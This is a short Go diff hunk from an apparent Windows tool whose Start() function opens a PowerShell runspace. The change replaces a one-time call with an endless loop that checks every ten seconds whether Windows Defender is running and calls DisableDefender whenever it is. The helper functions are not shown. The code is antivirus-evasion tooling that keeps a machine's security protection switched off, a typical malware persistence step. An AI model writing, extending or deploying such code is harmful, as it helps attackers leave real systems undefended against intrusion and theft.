@@ -187,10 +187,11 @@ func Start() {
 	runspace := powershell.CreateRunspaceSimple()
 	// auto cleanup your runspace
 	defer runspace.Close()
-	if IsDefenderRunning(runspace) {
-		DisableDefender(runspace, true)
-	} else {
-		DisableDefender(runspace, false)
+	for true {
+		if IsDefenderRunning(runspace) {
+			DisableDefender(runspace, true)
+		}
+		time.Sleep(time.Second * 10)
 	}
 
 }
